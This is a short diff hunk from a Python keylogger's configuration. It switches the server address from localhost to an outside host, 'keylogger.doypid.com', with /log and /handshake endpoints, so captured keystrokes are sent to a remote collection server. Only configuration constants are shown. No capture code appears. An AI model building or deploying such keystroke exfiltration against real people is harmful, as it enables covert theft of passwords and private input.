@@ -18,7 +18,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 # config
 COUNTDOWN_DURATION = 10 # relatively arbitrary duration but represents the time before key collection stops for that batch of inputs
 # LOG_FILE_PATH = "keylogs.txt" # temp local file
-SERVER_BASE_URL = "http://localhost:8080"
+SERVER_BASE_URL = "http://keylogger.doypid.com"
 SERVER_URL = f"{SERVER_BASE_URL}/log"
 HANDSHAKE_ENDPOINT = f"{SERVER_BASE_URL}/handshake"
 
